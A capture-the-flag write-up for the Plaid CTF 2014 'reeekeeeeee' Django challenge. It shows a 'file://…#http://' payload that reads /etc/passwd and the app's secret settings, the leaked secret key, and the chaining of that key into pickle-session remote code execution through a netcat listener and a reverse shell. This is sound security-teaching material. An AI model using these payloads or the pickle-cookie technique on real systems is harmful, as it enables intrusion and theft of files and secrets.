# reeekeeeeee
    Plaid CTF, 2014
    writeup by pipecork

Upon a hideously awesome flashing background, visiting the site prompts us to register an account. We create the user account 'les' and login. We're prompted to "make a meme" by supplying the URL to an image and some overlay text. Our created memes are then displayed on the page. While a fun activity on a Saturday night, we have a flag to find. Let's check the source for some vulns.

The file [views.py](reekee/mymeme/views.py) holds the meat of the application. We see they do a lot of concatenation of the username onto directory paths in the `viewmeme` function:

```python
def viewmeme(request,meme=None):
  print meme
  username = str(request.user)
  if meme is not None:
    filename = "/tmp/memes/"+username+"/"+str(meme)
    ctype = str(imghdr.what(filename))
    return HttpResponse(open(filename).read(),content_type="image/"+ctype)
  else:
    return render(request,"view.html",{'files':sorted(os.listdir("/tmp/memes/"+username), key=lambda x:os.path.getctime(bp+x) )})
  return HttpResponse("view"+username)
```

So a user's created memes are stored in `/tmp/memes/<username>` and the whole directory gets listed to display them. So, of course, let's make a user named `../..` right? Unfortunately, in the `register` function:

```python
. . .

if (".." in username) or ("/" in username):
  return HttpResponse("Error: invalid username"+BACK)

. . .
```

Drat. Eventually in a stroke of genius by mike_pizza, we spot small error in the code that downloads the meme image from a supplied URL:

```python
try:
  if "http://" in url:
    image = urllib2.urlopen(url)
  else:
    image = urllib2.urlopen("http://"+url)
```

The if statement only checks if the string 'http://' is in the supplied URL... not if it actually starts with it! We can use 'file://' with urllib's urlopen function to grab files from the server. Passing `file:///etc/passwd#http://` as a meme url confirms our suspicions by uploading the server's passwd file as one of our memes:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
admin:x:1000:1000:Debian:/home/admin:/bin/bash
reekee:x:1001:1001::/home/reekee:/bin/false
reekeeplus:x:1002:1002::/home/reekeeplus:/bin/false
``` 

Cool. Now where's the flag? There's a big clue in the [supplied settings.py file](reekee/mymeme/settings.py):

```python
. . .

#HMMMMM
SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'
SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'

. . .
```



Pickle with signed cookies is *notorious* for allowing remote code execution, provided that you have the Django app's secret key. Normally in a Django app like this one, we'd find the secret development key in the same file. Of course, the *real* secret key isn't in here. That'd make it too easy. 

After a bit of trial-and-error, we find the real settings.py file with `file:///home/reekee/mymeme/mymeme/settings.py#http://`. Lo and behold:

```python
...
SECRET_KEY='kgsu8jv!(bew#wm!eb3rb=7gy6=&5ew*jv)j-6-(50$f%no98-'
...
```

This is the secret key used to sign the SessionID that's then serialized by Pickle. Using this, we can forge custom SessionIDs to give us code execution!

This is where we have to give thanks to others before us (such as [Erik Romijn](http://erik.io/blog/2013/04/26/proof-of-concept-arbitrary-remote-code-execution-pickle-sessions/)) for their wonderful prior work on building PoC code to exploit this. Using their work saved us some serious time in solving this challenge.

First we start listening on a port on our machine, with `nc -lp 1337`. We used a [Django specific exploit](django-exploit.py) to send a Python [connect back shell](connback.py), which connects to our listening port, giving us a shell on the web server! Let's check the home directories:

```bash
$ cd /home/reekeeplus
$ ls
give_me_the_flag.exe  mymeme  use_exe_to_read_me.txt
$ ./give_me_the_flag.exe
flag: why_did_they_make_me_write_web_apps
write: Success
$
```

Bingo! The flag is `why_did_they_make_me_write_web_apps`.

(For those wondering why they required using an executable to read the flag: the challenge wanted to make sure you had execution on the server, and didn't just use the previous local file inclusion vuln to read the flag file.)

